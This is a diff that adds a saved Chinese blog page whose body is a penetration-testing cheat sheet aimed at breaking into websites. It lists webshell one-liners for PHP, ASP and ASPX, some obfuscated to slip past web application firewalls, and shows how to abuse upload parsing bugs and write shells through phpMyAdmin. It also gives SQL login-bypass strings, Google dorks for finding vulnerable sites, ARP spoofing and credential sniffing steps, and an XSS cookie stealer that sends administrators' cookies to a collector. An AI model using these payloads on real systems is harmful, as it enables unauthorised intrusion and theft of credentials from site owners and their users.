@@ -1,0 +1,1068 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="攻VS防，战略与战术！马拉松式工作！">
+    <title>渗透笔记 - 攻VS防，战略与战术！马拉松式工作！</title>
+    <meta name="author" content="Lao k17">
+    
+        <meta name="keywords" content="hexo,javascript,安全,">
+    
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Lao k17","sameAs":["https://paper.seebug.org/","https://js.tuisec.win/convert/ox2str/","https://www.cvedetails.com/","http://www.expku.com/","https://wy.tuisec.win/","https://s.threatbook.cn/"],"image":"https://www.gravatar.com/avatar/11cf39ebba4716a5945df93991af2a69"},"articleBody":"渗透笔记【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：DeDeCms（织梦）ECMS（帝国）PHPCMSPHP168HBcms（宏博）SupeSiteCMSware(思维)Joomla![BBS]Discuz![BBS]phpWind[SNS]UCenterHome[SNS]ThinkSNS[商城]EcShop[商城]ShopEx[博客]WordPress[维基]HDWiki[微博]PHPsay[DIGG]PBdigg—————————————————————————————–php开源mysql绝对路径开源系统 数据库配置文件名 文件名所在的目录\nDiscuz! config.inc.php ./ config.inc.php\nPhpcms config.inc.php ./include/config.inc.php\nWodpress wp-config.php ./ wp-config.php\nPhpwind sqlconfig.php ./data/sqlconfig.php\nphpweb config.inc.php ./config.inc.php\nPhp168v6 mysql_config.php ./php168/ mysql_config.php\nShopex config.php ./config/config.php\nEcshop config.php ./data/config.php\nJoomla configuration.php ./ configuration.php\nUCenter config.inc.php ./data/config.inc.php\nEmpireCMS config.php ./e/class/config.php\nDedecms common.inc.php .data/common.inc.php\nZen Cart configure.php ./includes/configure.php\nMediawiki localsettints.php ./config/localsettints.php\nEcshop config.php ./data/config.php\nosCommerce configure.php ./includes/configure.php\n—————————————————————————————–\n【 谷歌语法 】\nsite：可以限制你搜索范围的域名.\ninurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.\nintext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)\nintitle: 查包含关键词的页面，一般用于社工别人的webshell密码\nfiletype：搜索文件的后缀或者扩展名\nintitle：限制你搜索的网页标题.\nlink: 可以得到一个所有包含了某个指定URL的页面列表.\n查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms\n查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username\n查找可注入点：site:域名 inurl:aspx|jsp|php|asp\n查找上传漏洞：site:域名 inurl:file|load|editor|Files\n找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit\n存在的数据库：site:域名 filetype:mdb|asp|#\n查看脚本类型：site:域名 filetype:asp/aspx/php/jsp\n迂回策略入侵：inurl:cms/data/templates/images/index/网络设备关键词：intext:WEB Management Interface for H3C SecPath Series\n==========================================================================================================================\n【 一句话木马 】\nasp一句话木马：&lt;%eval request(“x”)%&gt;\nphp一句话木马：&lt;?php eval($_POST[g]);?&gt;\naspx一句话：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“x”],”unsafe”);%&gt;\n网站配置、版权信息专用一句话：”%&gt;&lt;%Eval Request(x)%&gt;\n一句话再过护卫神：&lt;%Y=request(“x”)%&gt; &lt;%execute(Y)%&gt;\n过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(“x”) %&gt;\nasp闭合型一句话 %&gt;&lt;%eval request(“0o1Znz1ow”)%&gt;&lt;%\n能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n突破安全狗的一句话：&lt;%Y=request(“x”)%&gt; &lt;%eval(Y)%&gt;\nelong过安全狗的php一句话：&lt;?php $a = “a”.”s”.”s”.”e”.”r”.”t”; $a($_POST[cc]); ?&gt;\n后台常用写入php一句话（密码x）：\n&lt;?\n$fp = @fopen(“c.php”, ‘a’);\n@fwrite($fp, ‘&lt;‘.’?php’.”\\r\\n\\r\\n”.’eval($_POST[x])’.”\\r\\n\\r\\n?”.”&gt;\\r\\n”);\n@fclose($fp);\n?&gt;\n高强度php一句话：\n&lt;?php substr(md5($_REQUEST[‘heroes’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt;\n新型变异PHP一句话(密码b4dboy):\n($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n突破安全狗的aspx一句话：\n&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;\n&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“你的密码”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;\n突破护卫神，保护盾一句话：\n&lt;?php $a = str_replace(x,””,”axsxxsxexrxxt”);\n$a($_POST[“test”]); ?&gt;\n许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。\n改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script〉\n这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。\nPHP高强度一句话：\n&lt;?php substr(md5($_REQUEST[‘x’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt; 菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c\n&lt;?php assert($_REQUEST[“c”]);?&gt; 菜刀连接 躲避检测 密码：c\n==========================================================================================================================\n【 解析漏洞总结 】\nIIS 6.0\n目录解析：/xx.asp/xx.jpg xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码\nIIS6.0 会将 xx.jpg 解析为 asp 文件。\n后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)\nIIS6.0 都会把此类后缀文件成功解析为 asp 文件。\n默认解析：/xx.asa /xx.cer /xx.cdx\nIIS6.0 默认的可执行文件除了 asp 还包含这三种\n此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg\nIIS 7.0/ IIS 7.5/ Nginx &lt;8.03\n在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。\n常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾\ne.g.\ncopy xx.jpg/b + yy.txt/a xy.jpg\n/b 即二进制[binary]模式\n/a 即ascii模式 xx.jpg正常图片文件\nyy.txt 内容 &lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;\n意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件\n找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。\n.然后就在图片目录下生成一句话木马 shell.php 密码 cmd\n==========================================================================================================================\n【 ewebeditor编辑器 】\n默认后台：ewebeditor/admin_login.asp\n帐号密码：admin admin\n样式设计：ewebeditor/admin_style.asp\n查看版本：ewebeditor/dialog/about.html\n数据库路径：db/ewebeditor.mdb db/%23ewebeditor.mdb db/%23ewebeditor.asp ewebeditor/db/!@#ewebeditor.asp (用谷歌语法找文件名)\n遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =../..\n跳转目录：ewebeditor/admin_uoloadfile.asp？id=14&amp;dir=.. (dir为列目录, ..为返回上层目录)，形式:dir ../..\n点上传文件管理-随便选择一个样式目录，得到：ewindoweditor/admin_uoloadfile.asp?id=14 在id=14后面加&amp;dir=../../../.. 就可看到整个网站的文件了(../自己加减)\n( ewebeditor5.5版本 )\n默认后台：ewebeditor/admin/login.asp\n帐号密码：admin 198625\n数据库路径：data/%23sze7xiaohu.mdb\n遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir=../\n调用样式上传页面：ewebeditor/ewebeditor.htm?id=body&amp;style=popup\n( ewebeditor3.8 php版本 )\n默认后台：eWebEditor/admin/login.php\n首先随便输入一个帐号和密码，接着系统会提示出错，这时清空浏览器的url，然后输入以下代码后连按三次回车键：\njavascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));\n接着访问文件：ewebeditor/admin/default.php 就可以直接进入后台了。\n( ewebeditor编辑器exp手册 )\n有时候什么后缀都上传了，还是不行。就增加一个asp:jpg格式 上传asp:jpg 试试\n一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg\n二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。\n页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用工具浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。\n==========================================================================================================================\n【 fckeditor编辑器 】\n查看版本：fckeditor/editor/dialog/fck_about.html\n编辑器页面：FCKeditor/_samples/default.html\n上传页面：fckeditor/editor/filemanager/connectors/test.html\n遍历目录：FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/\n编辑页面：fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp\n查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=\n( 拿shell方法总结 )\nASPX的站几乎都用fck编辑器，建议用工具扫一下，记住inc目录下可能存在fck编辑器，扫下这个目录。\n一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell\n二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg\n三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx\n四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次\n五：成功访问别人的一句话木马页面，http://xx.com/UploadFiles\\EditorFile\\file/2.asp;2(1).jpg 但不知道密码\nhttp://xx.com/UploadFiles\\EditorFile\\file\\2_asp;2.jpg 这个是图片木马，没有成功利用iis6.0解析漏洞还是图片，下载下来用记事本打开找到密码。\n六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php 例如：http://www.xxx.com/iges/php.jpg/.php\n( 建立文件夹 . 变 _ 的突破方法 )\n利用Fiddler web debugger 这款工具来进行修改数据包，从而达到突破的目的。\n注意：安装Fiddler web debugger，需要安装.net环境以及.net的SP2补丁方可运行！\n1.打开fck的上传页面，例如：fckeditor/editor/filemanager/browser/default/connectors/test.html\n2.再打开Fiddler web debugger这款工具，点击设置–自动断点–选择 “请求之前”\n3.接着打开fck的上传页面，创建文件夹，并输入你想要创建的文件名，例如：x.asp\n4.然后返回到Fiddler web debugger这款工具里，选择链接–点击右侧的嗅探\n5.修改currentfolder内的参数，改成你要建立的文件夹名字，如：x.asp\n6.然后点击右侧的：run to completion\n7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了\n==========================================================================================================================\n【 linux 】\n解析格式：1.php.xxx (xxx可以是任意)\n如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。\n辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统.\n==========================================================================================================================\n【 旁注 】\n旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：http://cn.bing.com/ 搜索格式：ip:服务器ip aspx\n比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。\n==========================================================================================================================\n【 phpmyadmin 】\n查看版本：test.php 或 phpinfo.php\n默认账号密码：root root\n万能帐号密码：’localhost’@’@” 密码空\n拿shell第一种方法：\nCREATE TABLE mysql.darkmoon (darkmoon1 TEXT NOT NULL );\nINSERT INTO mysql.darkmoon (darkmoon1 ) VALUES (‘&lt;?php @eval($_POST[pass]);?&gt;’);\nSELECT darkmoon1 FROM darkmoon INTO OUTFILE ‘d:/wamp/www/darkmoon.php’;\nDROP TABLE IF EXISTS darkmoon;拿shell第二种方法：\nCreate TABLE moon (darkmoon text NOT NULL);\nInsert INTO moon (darkmoon) VALUES(‘&lt;?php @eval($_POST[pass]);?&gt;’);\nselect darkmoon from moon into outfile ‘d:/wamp/www/darkmoon2.php’;\nDrop TABLE IF EXISTS moon;拿shell第三种方法：\nselect ‘&lt;?php @eval($_POST[pass]);?&gt;’INTO OUTFILE ‘d:/wamp/www/darkmoon3.php’\n拿shell第四种方法\nselect ‘&lt;?php echo \\’\\’;system($_GET[\\’cmd\\’]); echo \\’\\’; ?&gt;’ INTO OUTFILE ‘d:/wamp/www/darkmoon4.php’\n127.0.0.1/darkmoon4.php?cmd=net user找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。\nphpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。\n修改mysql默认的root用户名方法:\n进入phpmyadmin,进入mysql表,执行sql语句\n1.update user set user=’你的新root用户名’ where user=’root’;\n2.flush privileges;\n例如：\n用root身份登入，进入mysql库，修改user表即可。\n1.use mysql;2.mysql&gt;update user set user=’newName’ where user=’root’;\n3.mysql&gt; flush privileges;\n==========================================================================================================================\n【 万能密码 】\n( php )\n帐号：’ UNION Select 1,1,1 FROM admin Where ”=’\n密码：1\n( asp )\n‘xor\n‘or’=’or’\n‘or”=”or”=’\n‘or ‘1’=’1’or ‘1’=’1\n‘or 1=1/*\n==========================================================================================================================\n【 批量关键词 】\ninurl:asp?id=\ninurl:detail.php?\nCompHonorBig.asp?id= 很不错的的一个搜索注入点\ninurl:show.asp? 非常强大\nsite:www.yuming.com\ninurl:articleshow.asp?articleid=数字\ninurl:szwyadmin/login.asp\ninurl:asp?id=1 intitle:政府\n杭州 inurl:Article_Class2.asp?\n==========================================================================================================================【 木马后门 】\n1.TNTHK小组内部版 —— 存在关键词后门，随便输入一个错的密码，右键查看源文件，找到错误关键词后面的font，在font后面的就是正确密码。\n2.不灭之魂—不死僵尸变种 —— 用这款工具专门爆这款大马的密码：爆不灭之魂密码\n3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk\n==========================================================================================================================\n【 安全狗 】\n1.过注入\n方法一：a.asp?aaa=%00&amp;id=sql语句\n方法二： a.asp?id=sql语句 里面把安全过滤的加个%l 比如： un%aion sel%aect 1,2,3,4 fr%aom admin\n2.过大马被阻拦访问\n方法一：上传一个大马 然后访问http://sss.com/dama.asp ; 访问后出现拦截。\n那么解决方法 先将dama.asp改名dama.jpg上传，然后在同目录上传个文件da.asp 内容为： &lt;!–#include file=”dama.jpg” –&gt; 这样再访问da.asp 就不会被拦截了。\n3.过菜刀连接一句话被拦截\n方法一：不用菜刀连接一句话，用别的一句话连接端。\n方法二：中转下连接菜刀，把过滤掉的词替换掉。\n==========================================================================================================================【 本地构造上传漏洞 】\n寻找程序上传漏洞，必须从上传页面的源文件入手，目标有两个：\n1.filename (文件名称) 在上传页面中针对文件扩展名过滤不严，从而上传可执行的脚本木马。\n2.filepath (文件路径) 在上传页面针对路径过滤不严，导致可以修改上传相对路径上传脚本木马。\n当检测到一个上传页面，asp、asa后缀已经被过滤掉的时候，可以尝试抓包明小子或NC上传！\n不行就利用本地上传漏洞构造上传！例如上传页面是：http://www.xx.com/upfile_other.asp\n1.右键查看源文件，找到这段代码：&lt;form name=”form1″ method=”past” action=”zwhua_upload1.asp” enctype=”multipart/form-data”&gt;\n把以上代码中actino处的路径补全！即：&lt;form name=”form1″ method=”past” action=”http://www.xxx.com/zwhua_upload1.asp” enctype=”multipart/form-data”&gt;\n2.再找到这段代码：&lt;input type=”hidden” name=”filepath” value=”uploadfile/”&gt;\n利用IIS6.0解析漏洞，把以上代码中value处的文件补全！即：&lt;input type=”hidden” name=”filepath” value=”uploadfile/1.asa; “&gt; 注意：冒号后面有空格！\n3.接着保存为1.html，将刚保存的文件拖进去C32里，选择十六进制模式，找到“1.asa; ”后面的空格，将其填充为00后保存退出！\n4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！\n==========================================================================================================================\n【 利用双文件上传拿shell 】\n因为网站只判断一次，如果第一个文件后缀是在白名单里面的话，就让其上传，并没有判断第二个文件，所以上传任意格式的文件也让其通过。\n当系统验证cookie的时候，就要用到火狐浏览器了，登录网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。\n1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm” 之后补全路径访问。\n2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！\n4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://www.xxxx.com/upfile_other.asp\n3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。\n==========================================================================================================================\n【 数据库备份抓包改包NC提交拿shell 】\n当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！\n在抓包的时候，最好用火狐浏览器，因为有的浏览器抓不到包，首先上传一张图片木马复制下地址，接着对备份过程进行抓包！把抓到的数据复制在文本里面！\n开始本地修改，先把POST处补全网址，找到最底下的一行数据，再复制多一行对比长度进行修改，把备份的数据名称替换为木马地址，备份的名称改为自己想要的asp后缀！\n再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt\n==========================================================================================================================\n【 本地构造数据库备份突破拿shell 】\n当上传jpg木马得到路径前去备份时，发现数据库备功能用不了的情况下，可以尝试本地构造突破拿shell！\n首先查看源文件，找到“当前数据库路径”修改为刚上传jpg木马的路径，再找到“数据库备份名称”修改为1.asa\n找到“” 将路径补全“&lt;form method=”past” action=”http://xxx.com/admin/Backup.asp?action=Backup”&gt;”\n最后保存为1.html，有的网站不验证cookie的话，直接打开进行备份就能成功了，但是一般都需要验证cookie，这时就用上火狐浏览器了。\n因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！\n==========================================================================================================================\n【 本地构造限制上传类型漏洞 】\n一般用于直接扫到的上传页面，名称是：上传图片，上传asp、asa等脚本时提示“请选择jpg或gif文件!”\n这时通过这个方法一般都能成功，首先保存到本地1.asp 放到小旋风的目录下，然后找到以下这段代码：\nalert(“请点击浏览按钮，选择您要上传的jpg或gif文件!”)\nmyform.file1.focus;\nreturn (false);\n}\nelse\n{\nstr= myform.file1.value;\nstrs=str.toLowerCase();\nlens=strs.length;\nextname=strs.substring(lens-4,lens);\nif(extname!=”.jpg” &amp;&amp; extname!=”.gif”)\n{\nalert(“请选择jpg或gif文件!”);\n看到这句代码：if(extname!=”.jpg” &amp;&amp; extname!=”.gif”) 改为： if(extname!=”.jpg” &amp;&amp; extname!=”.gif” &amp;&amp; extname!=”.asp”)\n然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。\n==========================================================================================================================\n【 抓包改包NC提交拿shell 】\n1.抓包数据中如果存在name=”filepath”或是name=”filename”，那么就可以满足NC的上传条件了。\n2.将木马的抓包数据复制到文本文件中。例如：1.txt\n3.将路径补全：\nfilepath截断法：\nuploadfile/路径后添加1.asp空格 (16进制下面将20改为00)\nfilename自定义名称：\nC:\\Documents and Settings\\lei\\桌面\\1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)\n3.在Content-Length处加上../uploadfile/后增加的字节数。\n4.用C32将空格的20改为00，保存为1.txt。\n5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv www.XXXX.com 80&lt;1.txt\n( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )\n==========================================================================================================================\n【 抓包nc上传获取管理权限 】\n这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。\n接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。\n在看到最底下的loginname=这行代码，把最后面的验证码改成当前会员登陆的验证码，然后将nc\\1.txt 放在同一个目录下，cmd命令：nc 域名 80&lt;1.txt\n成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！\n==========================================================================================================================\n【 cookie欺骗 】\n当我们通过注入或是社工把管理员的帐号跟md5密码搞到手的时候，却发现破解不出密码 (MD5是16位加密的)\n那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。\n==========================================================================================================================\n【 cookie中转突破防注入 】\n有时检测一个网站，系统会弹出一些SQL防注入的提示框，这时我们可以利用COOKIE中转注入来进行突破，首先准备一个webshell，然后打开COOKIE中转工具。\n复制注入点到“注入URL地址跟来源页”处，把问号去掉，再把问号后面的ID=剪切到“注入键名”里，再把ID=后面那个参数剪切到“POST提交值”里替换jmdcw=后面的参数。\n点击生成，再把生成的文件上传到webshell里，然后访问路径，再页面地址后面加“?jmdcw=参数”，这样搭建构造出来的注入点就绕过防注入了！\n以上是在webshell里搭建ASP坏境的方法，下面的是本地架设ASP环境的方法：\n利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面+文件名+问号+jmdcw=参数即可。\n==========================================================================================================================\n【 cookie手工突破防注入 】\n第一种方法：\n用 and 1=1 and 1=2 检测网站是否存在注入点时，如果提示你的IP已被记录，就说明系统做了防注入措施，可以用代码来突破。\n管理员只过滤了and，但是没有过滤or，我们可以先猜网站的字段数 格式：order by 数字 猜到错为止，然后选前一个对的数字！\n比如猜到14错误，那就是13了，然后利用Cookie提交变量值，代码：javascript:alert(document.cookie=id=”+escape(“这里填写变量值，例如：id=408”));\n开始猜解表段，代码：javascript:alert(document.cookie=”id=”+escape(“变量值 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from admin”));\n复制在浏览器里打开，将出现一个提示框，点击确定就会注射进去，再重新打开网站（要在此处打开，所以前面最好复制下网站地址）\n然后就会出现两个提示数字，比如5跟6，然后在代码的5跟6处猜帐号密码，常见的帐号有：user username 密码:pass password\n复制修改后的代码放到浏览器里打开，就会爆破出网站的帐号密码了。\n第二种方法：\n注入点：http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098\n首先把?id=408去掉，然后访问如果提示“数据库出错”！就说明网站没有过滤Cookie提交方式，可以利用Cookie欺骗绕过防注入！\n利用Cookie提交变量值，代码：javascript:alert(document.cookie=”id=”+escape(“4098”)\n下面开始在Cookie注入中执行常规注入攻击，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=1”));\n访问http://www.XXXXXXXX.gov.cn/shownews.asp 显示正常页面，\n再提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2”)); 显示错误页面！\n下面来开始猜解表段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select * from 表段)”))；\n接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”))； 例如：username\n接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”)), 例如：password\n下面开始猜字段数跟字段内容了，提交代码:javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2 union select 1,2,3,4,5,6 from 表段”));\n一直猜解到对为止，这里只是猜到6，记得继续加减！猜解到对的时候，页面会出现数字，然后在相对应的数字替换字段名，再进行提交代码！\n这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）\n==========================================================================================================================\n【 伪静态注入 】\n伪静态网站注入方法，通常情况下，动态脚本的网站的url类似下面这样：\nhttp://www.91ri.org/news.php?id=111\n做了伪静态之后就成这样了：\nhttp://www.91ri.org/news.php/id/111.html\n以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了。\n常规的伪静态页面如下：http://www.XXX.com/play/Diablo.html\n例如关联的动态页面是game.php ，那么当用户访问后程序会自动转换成类似http://www.XXX.com/game.php?action=play&amp;name=Diablo 的形式\n注入点检测可以用：http://www.XXX.com/play/Diablo’ and 1=’1.html与http://www.XXX.com/play/Diablo’ and 1=’2.html来判断\n通常情况下，动态脚本的网站的url类似下面这样：http://www.xxoo.net/aa.php?id=123\n做了伪静态之后类似这样：http://www.xxoo.net/aa.php/id/123.html 以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了！\n==========================================================================================================================\n【 嗅探 】\n当入侵一个网站，该网站没有任何漏洞的情况下，可以进行旁注，再提权拿下任意一台服务器，不行的话就C段，提权拿下任意一台服务器。\n只要能拿下同网段的任意一台服务器，就可以使用C段嗅探来获取主站的帐号密码，cain是一款强大的劫持工具。\n在服务器里安装cain后打开主控端，点击配置-&gt;选择服务器IP一项-&gt;在路由追踪一项取消全部-&gt;确定。\n设置完毕后点击一下激动按钮(中间那个)，再点击嗅探器，点击加号符号，选择所有在子网主机，选择ARP测试(传播 31-位)，确定。\n扫描完毕选择网关一项，点击ARP，点击加号符号，左边选择网关，右边选择全部的C段，确定，点击开始嗅探按钮(第三个)，嗅探到的帐号密码在口令一项展现！\n如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。\n==========================================================================================================================\n【 arp欺骗 】\n只要该服务器存在C段，都可以尝试arp欺骗，用到的工具是NetFuke，想知道arp劫持能不能成功，cmd命令：arp -a 看一下，动态的服务器IP就能成功，静态的就不能。\n安装完运行主控端，设置–嗅探设置–网卡选择服务器的IP–控制选项选择“启用ARP欺骗、启用过滤器、启用分析器、启用修改器、主动转发” 确定。\n设置–ARP欺骗–双向欺骗–来源Ip填服务器的网关–中间人IP填服务器的IP–目标IP填要欺骗的任意C段ip(用御剑扫描C段)–确定。\n插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！\n==========================================================================================================================\n【 突破安全狗防注入及上传 】\n写入webshell 写不进去，平常的一句话 也失效，用这段代码：\n&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt; &lt;%try{System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“admin163.net”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null,null); } catch { }%&gt;\n连接端用cncert的aspx一句话客户端\n2、IIS6.0解析漏洞遇到安全狗\n文件名为http://www.baicai.com/1.asp;1.jpg\n这样的会被IIS安全狗果断屏蔽\n改成如下名称,IIS6一样会解析:\nwww.baicai.com/;1.asp;1.jpg\n3、安全狗的注入绕过\n常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。\n但这样就可以突破了：\nbaicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1\n==========================================================================================================================\n【 跨站xss 】\n在网站留言或者能输入信息的地方提交跨站代码，从而盗取管理员cookie，然后用cookie浏览器直接进入后台，将以下代码保存为asp文件，例如1.asp&lt;%\nthisfile=Server.MapPath(“cookie.txt”)\nmsg=Request(“msg”)\nset fs=server.CreateObject(“scripting.filesystemobject”)\nset thisfile=fs.OpenTextFile(thisfile,8,True,0)\nthisfile.WriteLine(“=======cookie:”&amp;msg&amp;”======by:剑眉大侠”)\nthisfile.close\nset fs=nothing\n%&gt;\n首先搭建一个asp环境，推荐使用“ASP服务器（摆脱安装IIS）” 再将1.asp放在wwwroot目录下，访问1.asp文件如果提示下载，则说明搭建成功了。\n然后在留言板的“您的网站”一处输入：doucument.location=’http://127.0.0.1/1.asp?msg=’document.cookie\n当管理员浏览我们提交的留言时，将在wwwroot目录下生成一个cookie.txt文件，这时我们只要访问cookie.txt这个文件，就能知道管理员的cookie是多少了！\n然后再使用桂林老兵的cookie欺骗工具或是网页源代码查看分析器，访问网站再输入cookie进行欺骗登录即可！（填cookei的时候记得选择自定义）\n小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。\n==========================================================================================================================\n【 爆库 